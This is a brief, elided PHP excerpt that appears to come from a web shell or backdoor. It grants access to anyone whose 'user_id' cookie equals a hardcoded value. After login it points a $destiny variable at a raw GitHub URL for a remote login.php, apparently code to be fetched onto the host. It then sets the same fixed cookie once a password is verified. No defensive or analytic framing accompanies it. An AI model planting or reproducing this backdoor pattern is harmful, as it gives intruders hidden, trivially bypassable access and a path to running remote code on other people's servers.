...
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'AWOKAWOKAWOK'; 
}
...
if (is_logged_in()) {
    ...
    $destiny = 'https://raw.githubusercontent.com/aptisme/random/refs/heads/main/login.php';
    ...
    if (isset($_POST['password'])) {
        ...
        if (password_verify($entered_key, $hashed_key)) {
            setcookie('user_id', 'AWOKAWOKAWOK', time() + 3600, '/'); 
